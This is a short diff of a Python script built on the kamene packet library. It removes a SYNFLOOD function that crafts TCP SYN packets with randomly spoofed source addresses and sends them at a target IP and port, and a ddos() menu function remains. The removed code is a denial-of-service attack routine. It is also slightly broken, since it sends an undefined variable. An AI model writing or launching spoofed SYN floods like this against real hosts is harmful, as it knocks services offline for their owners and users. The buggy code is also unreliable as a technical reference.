@@ -8,11 +8,6 @@ from kamene.all import *
 from kamene.layers.inet import IP, TCP
 from kamene.volatile import RandShort
 
-def SYNFLOOD(ip_addy, source_port, destination_port):
-    source_addr = RandIP()
-    destination_ip = ip_addy
-    tcp_packet = IP(src=source_addr, dst=destination_ip)/TCP(sport=source_port, dport=destination_port, seq=1505066, flags="S")
-    send(packet)
 def ddos():
     os.system("clear")
     fig = Figlet(font='slant')
